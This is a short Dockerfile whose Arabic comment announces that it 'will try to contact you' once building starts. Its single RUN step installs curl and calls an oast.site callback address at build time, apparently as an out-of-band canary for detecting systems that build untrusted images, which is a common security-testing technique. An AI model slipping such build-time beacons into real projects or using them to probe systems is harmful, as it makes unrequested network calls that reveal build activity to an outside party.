FROM alpine:latest
# أول ما يبدأ يبني، هيحاول يكلمك
RUN apk add --no-cache curl && curl http://d51d9d03t4giu7nmfkc0bzuofng4cqjz8.oast.site/docker_build
